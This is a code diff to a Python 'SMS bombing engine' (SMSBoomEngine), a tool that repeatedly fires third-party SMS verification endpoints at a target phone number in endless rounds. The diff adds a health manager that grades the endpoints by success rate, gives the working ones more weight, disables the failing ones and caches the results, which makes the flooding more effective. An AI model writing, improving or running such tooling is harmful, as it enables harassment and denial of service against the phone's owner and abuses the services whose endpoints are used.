@@ -12,10 +12,12 @@ import json
 from colorama import init, Fore, Style
 from urllib.parse import quote
 import urllib3
-from typing import Dict, List, Optional, Callable
+from typing import Dict, List, Optional, Callable, Tuple
 from dataclasses import dataclass, field
 from enum import Enum
 import logging
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from pathlib import Path
 
 # 初始化
 init(autoreset=True)
@@ -30,6 +32,7 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
+HEALTH_CACHE_FILE = 'interface_health_cache.json'
 
 
 class RequestMethod(Enum):
@@ -129,11 +132,296 @@ class SMSInterface:
             return False
 
 
+class InterfaceGrade(Enum):
+    """接口等级枚举"""
+    A = "A"  # 优秀: 成功率 >= 70%
+    B = "B"  # 良好: 成功率 >= 40%
+    C = "C"  # 一般: 成功率 >= 15%
+    D = "D"  # 差: 成功率 < 15%
+
+
+@dataclass
+class HealthStatus:
+    """接口健康状态"""
+    name: str
+    success_count: int = 0
+    fail_count: int = 0
+    structurally_valid: bool = True   # 结构是否有效
+    last_success: bool = True         # 最近一次是否成功
+    consecutive_fails: int = 0        # 连续失败次数
+    grade: InterfaceGrade = InterfaceGrade.B
+    dynamic_weight: float = 1.0       # 动态权重乘数
+
+    @property
+    def total_count(self) -> int:
+        return self.success_count + self.fail_count
+
+    @property
+    def success_rate(self) -> float:
+        return (self.success_count / self.total_count * 100) if self.total_count > 0 else 0.0
+
+
+class InterfaceHealthManager:
+    """接口健康管理器 - 探活、评级、动态调度、持久化"""
+
+    GRADE_WEIGHTS = {
+        InterfaceGrade.A: 3.0,
+        InterfaceGrade.B: 1.5,
+        InterfaceGrade.C: 0.5,
+        InterfaceGrade.D: 0.0,   # D 级自动禁用
+    }
+
+    GRADE_COLORS = {
+        InterfaceGrade.A: Fore.GREEN,
+        InterfaceGrade.B: Fore.CYAN,
+        InterfaceGrade.C: Fore.YELLOW,
+        InterfaceGrade.D: Fore.RED,
+    }
+
+    def __init__(self):
+        self.health_data: Dict[str, HealthStatus] = {}
+        self._load_cache()
+
+    # ---------- 持久化 ----------
+
+    def _load_cache(self):
+        """从缓存文件加载健康数据"""
+        cache_path = Path(HEALTH_CACHE_FILE)
+        if not cache_path.exists():
+            logger.info("未找到健康缓存，将使用初始状态")
+            return
+        try:
+            with open(cache_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            for name, info in data.get('interfaces', {}).items():
+                status = HealthStatus(
+                    name=name,
+                    success_count=info.get('success_count', 0),
+                    fail_count=info.get('fail_count', 0),
+                    structurally_valid=info.get('structurally_valid', True),
+                    last_success=info.get('last_success', True),
+                    consecutive_fails=info.get('consecutive_fails', 0),
+                )
+                self._recalculate_grade(status)
+                self.health_data[name] = status
+            logger.info(f"从缓存加载了 {len(self.health_data)} 个接口的健康数据")
+        except (json.JSONDecodeError, IOError) as e:
+            logger.warning(f"加载健康缓存失败: {e}")
+            self.health_data = {}
+
+    def save_cache(self):
+        """保存健康数据到缓存文件"""
+        data = {
+            'last_updated': time.strftime('%Y-%m-%d %H:%M:%S'),
+            'total_interfaces': len(self.health_data),
+            'interfaces': {}
+        }
+        for name, status in self.health_data.items():
+            data['interfaces'][name] = {
+                'success_count': status.success_count,
+                'fail_count': status.fail_count,
+                'success_rate': round(status.success_rate, 1),
+                'grade': status.grade.value,
+                'structurally_valid': status.structurally_valid,
+                'last_success': status.last_success,
+                'consecutive_fails': status.consecutive_fails,
+                'dynamic_weight': round(status.dynamic_weight, 2),
+            }
+        try:
+            with open(HEALTH_CACHE_FILE, 'w', encoding='utf-8') as f:
+                json.dump(data, f, ensure_ascii=False, indent=2)
+            logger.info(f"健康数据已保存到 {HEALTH_CACHE_FILE}")
+        except IOError as e:
+            logger.error(f"保存健康缓存失败: {e}")
+
+    # ---------- 评级 ----------
+
+    def _get_or_create(self, name: str) -> HealthStatus:
+        """获取或创建接口健康状态"""
+        if name not in self.health_data:
+            self.health_data[name] = HealthStatus(name=name)
+        return self.health_data[name]
+
+    @staticmethod
+    def _recalculate_grade(status: HealthStatus):
+        """根据成功率重新计算等级和动态权重"""
+        if not status.structurally_valid:
+            status.grade = InterfaceGrade.D
+            status.dynamic_weight = 0.0
+            return
+        rate = status.success_rate
+        if status.total_count == 0:
+            status.grade = InterfaceGrade.B
+            status.dynamic_weight = InterfaceHealthManager.GRADE_WEIGHTS[InterfaceGrade.B]
+            return
+        if rate >= 70:
+            status.grade = InterfaceGrade.A
+        elif rate >= 40:
+            status.grade = InterfaceGrade.B
+        elif rate >= 15:
+            status.grade = InterfaceGrade.C
+        else:
+            status.grade = InterfaceGrade.D
+        status.dynamic_weight = InterfaceHealthManager.GRADE_WEIGHTS[status.grade]
+
+    # ---------- 智能权重 ----------
+
+    def get_smart_weighted_tasks(self, interfaces: List[SMSInterface]) -> List[SMSInterface]:
+        """获取智能权重任务列表（结合配置权重和健康权重）"""
+        tasks = []
+        for iface in interfaces:
+            if not iface.enabled:
+                continue
+            status = self._get_or_create(iface.name)
+            # 结构无效的接口跳过
+            if not status.structurally_valid:
+                continue
+            # 计算有效权重: 配置权重 * 动态健康权重
+            effective_weight = max(1, int(iface.weight * status.dynamic_weight))
+            tasks.extend([iface] * effective_weight)
+        return tasks
+
+    # ---------- 探活 ----------
+
+    @staticmethod
+    def _check_interface_structure(iface: SMSInterface) -> Tuple[bool, str]:
+        """检查接口结构有效性（不发网络请求）"""
+        # 1. URL 检查
+        if not iface.url or not iface.url.startswith(('http://', 'https://')):
+            return False, "URL无效"
+
+        # 2. 数据模板检查
+        if iface.data_template:
+            tmpl = iface.data_template.strip()
+
+            # JSON 内容类型检查
+            if iface.content_type == ContentType.JSON:
+                # 替换占位符后尝试解析
+                test_data = tmpl.replace('{phone}', '13800138000')
+                # 处理双引号包裹的模板 ""{...}""
+                if test_data.startswith('""') and test_data.endswith('""'):
+                    test_data = test_data[2:-2]
+                try:
+                    json.loads(test_data)
+                except json.JSONDecodeError:
+                    return False, f"JSON模板无效: {tmpl[:40]}"
+
+            # 表单编码检查
+            elif iface.content_type == ContentType.FORM:
+                if not tmpl or tmpl in ['{', ',', '{phone}']:
+                    return False, f"表单模板无效: {tmpl[:40]}"
+
+            # 通用内容检查
+            else:
+                if len(tmpl) <= 1 and tmpl in ['{', ',', '[', '']:
+                    return False, "数据模板内容不足"
+
+        # 3. 无模板的 GET 请求，URL 里应包含 phone 占位符
+        if not iface.data_template and '{phone}' not in iface.url:
+            if not iface.params:
+                return False, "无数据模板且URL无phone参数"
+
+        return True, "OK"
+
+    def run_health_probe(self, interfaces: List[SMSInterface]) -> Dict[str, bool]:
+        """运行接口健康探活（结构检查 + 缓存加载）"""
+        enabled = [iface for iface in interfaces if iface.enabled]
+        total = len(enabled)
+        print(f"\n{Fore.CYAN}{'='*50}")
+        print(f"{Fore.YELLOW}🔍 接口健康探活  ({total} 个启用接口){Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+
+        # 显示缓存加载信息
+        if self.health_data:
+            valid_cached = sum(1 for s in self.health_data.values() if s.structurally_valid)
+            print(f"{Fore.CYAN}📂 已加载历史健康数据: {valid_cached}/{len(self.health_data)} 个接口{Style.RESET_ALL}")
+
+        passed, failed = 0, 0
+        for iface in enabled:
+            valid, msg = self._check_interface_structure(iface)
+            status = self._get_or_create(iface.name)
+            status.structurally_valid = valid
+            self._recalculate_grade(status)
+
+            if valid:
+                passed += 1
+                grade_color = self.GRADE_COLORS.get(status.grade, Fore.WHITE)
+                print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {iface.name:<25} {grade_color}[{status.grade.value}]{Style.RESET_ALL}")
+            else:
+                failed += 1
+                print(f"  {Fore.RED}✗{Style.RESET_ALL} {iface.name:<25} {Fore.RED}{msg}{Style.RESET_ALL}")
+
+        # 汇总
+        print(f"\n{Fore.CYAN}{'─'*50}")
+        print(f"{Fore.GREEN}✓ 通过: {passed}{Style.RESET_ALL}  "
+              f"{Fore.RED}✗ 未通过: {failed}{Style.RESET_ALL}  "
+              f"成功率: {(passed/total*100):.1f}%")
+        if failed > 0:
+            print(f"{Fore.YELLOW}⚠️  未通过的接口将被自动跳过{Style.RESET_ALL}")
+        print()
+
+        self.save_cache()
+        return {iface.name: self._get_or_create(iface.name).structurally_valid for iface in enabled}
+
+    # ---------- 运行时记录 ----------
+
+    def record_result(self, iface_name: str, success: bool):
+        """记录单次请求结果"""
+        status = self._get_or_create(iface_name)
+        if success:
+            status.success_count += 1
+            status.consecutive_fails = 0
+            status.last_success = True
+        else:
+            status.fail_count += 1
+            status.consecutive_fails += 1
+            status.last_success = False
+        self._recalculate_grade(status)
+
+    def update_after_round(self, results: List[Tuple[str, bool]]):
+        """每轮结束后批量更新并持久化"""
+        for name, success in results:
+            self.record_result(name, success)
+        self.save_cache()
+
+    # ---------- 报告 ----------
+
+    def print_health_report(self):
+        """打印接口健康报告"""
+        if not self.health_data:
+            print(f"{Fore.YELLOW}暂无健康数据{Style.RESET_ALL}")
+            return
+
+        grade_counts = {g: 0 for g in InterfaceGrade}
+        for status in self.health_data.values():
+            grade_counts[status.grade] += 1
+
+        print(f"\n{Fore.CYAN}{'─'*50}")
+        print(f"{Fore.YELLOW}📊 接口健康报告{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'─'*50}")
+        for grade in InterfaceGrade:
+            count = grade_counts[grade]
+            color = self.GRADE_COLORS[grade]
+            print(f"  {color}[{grade.value}]{Style.RESET_ALL} {count} 个")
+
+        # 按成功率排序展示所有接口
+        sorted_items = sorted(self.health_data.values(), key=lambda s: s.success_rate, reverse=True)
+        print(f"\n  {'接口名称':<25} {'等级':^5} {'成功率':^8} {'成功/总数'}")
+        for status in sorted_items:
+            color = self.GRADE_COLORS.get(status.grade, Fore.WHITE)
+            valid_mark = "" if status.structurally_valid else f" {Fore.RED}[无效]{Style.RESET_ALL}"
+            print(f"  {status.name:<25} {color}[{status.grade.value}]{Style.RESET_ALL} "
+                  f"{status.success_rate:>5.1f}%   "
+                  f"{status.success_count}/{status.total_count}{valid_mark}")
+        print()
+
+
 class InterfaceManager:
     """接口管理器 - 统一管理所有短信接口"""
     
-    def __init__(self):
+    def __init__(self, health_manager: Optional['InterfaceHealthManager'] = None):
         self.interfaces: List[SMSInterface] = []
+        self.health_manager = health_manager
         self._load_interfaces()
     
     def _load_interfaces(self):
@@ -174,7 +462,9 @@ class InterfaceManager:
         return [iface for iface in self.interfaces if iface.enabled]
     
     def get_weighted_tasks(self) -> List[SMSInterface]:
-        """获取带权重的任务列表"""
+        """获取带权重的任务列表（智能调度优先）"""
+        if self.health_manager:
+            return self.health_manager.get_smart_weighted_tasks(self.interfaces)
         tasks = []
         for iface in self.get_enabled_interfaces():
             tasks.extend([iface] * iface.weight)
@@ -323,7 +613,8 @@ class SMSBoomEngine:
     """短信轰炸引擎 - 核心业务逻辑"""
     
     def __init__(self):
-        self.interface_manager = InterfaceManager()
+        self.health_manager = InterfaceHealthManager()
+        self.interface_manager = InterfaceManager(health_manager=self.health_manager)
         self.ui = UIController()
         self.is_running = False
     
@@ -349,7 +640,8 @@ class SMSBoomEngine:
             self._execute_campaign(phone)
             
         except KeyboardInterrupt:
-            print(f"\n\n{Fore.RED}⚠️  程序被用户中断{Style.RESET_ALL}")
+            self.health_manager.save_cache()
+            print(f"\n\n{Fore.RED}⚠️  程序被用户中断（健康数据已保存）{Style.RESET_ALL}")
         except Exception as e:
             logger.error(f"程序异常: {e}")
             print(f"{Fore.RED}✗ 程序错误: {str(e)}{Style.RESET_ALL}")
@@ -357,48 +649,64 @@ class SMSBoomEngine:
     def _execute_campaign(self, phone: str):
         """执行短信发送活动"""
         cycle_count = 1
-        
+
+        # 启动前运行健康探活
+        self.health_manager.run_health_probe(self.interface_manager.interfaces)
+        input(f"{Fore.CYAN}按 Enter 开始执行...{Style.RESET_ALL}")
+
         while True:
             self.ui.clear_screen()
             self.ui.print_logo()
-            
+
             # 显示状态
             print(f"{Fore.CYAN}{'='*50}")
             print(f"{Fore.MAGENTA}📱 目标号码: {phone[:3]}****{phone[7:]}")
             print(f"{Fore.MAGENTA}🔄 循环次数: {cycle_count}")
             print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
-            
-            # 获取任务列表
+
+            # 获取智能调度任务列表
             tasks = self.interface_manager.get_weighted_tasks()
             random.shuffle(tasks)
-            
+
+            if not tasks:
+                print(f"{Fore.RED}⚠️  没有可用的接口任务！请检查接口配置和健康状态{Style.RESET_ALL}")
+                input(f"{Fore.YELLOW}按 Enter 退出...{Style.RESET_ALL}")
+                return
+
             # 创建进度追踪器
             tracker = ProgressTracker(len(tasks))
-            
+            round_results: List[Tuple[str, bool]] = []
+
             start_time = time.time()
-            
+
             # 执行任务
             for task in tasks:
                 success = task.send(phone)
                 tracker.update(success)
                 tracker.display()
-                
+                round_results.append((task.name, success))
+
                 # 小延迟避免过快请求
                 time.sleep(0.05)
-            
+
             # 本轮完成
             elapsed = time.time() - start_time
             print(f"\n\n{Fore.CYAN}✓ 本轮完成")
             print(f"{Fore.CYAN}⏱️  耗时: {Fore.YELLOW}{elapsed:.2f}秒")
             print(f"{Fore.CYAN}📊 成功率: {Fore.GREEN}{(tracker.success/tracker.total*100):.1f}%")
+
+            # 更新健康数据并打印报告
+            self.health_manager.update_after_round(round_results)
+            self.health_manager.print_health_report()
+
             print(f"{Fore.CYAN}即将开始下一轮...{Style.RESET_ALL}")
-            
+
             # 倒计时
             for i in range(5, 0, -1):
                 sys.stdout.write(f"\r{Fore.YELLOW}⏳ 等待: {i}秒{Style.RESET_ALL} ")
                 sys.stdout.flush()
                 time.sleep(1)
-            
+
             cycle_count += 1
     
     def add_custom_interface(self, config: Dict):
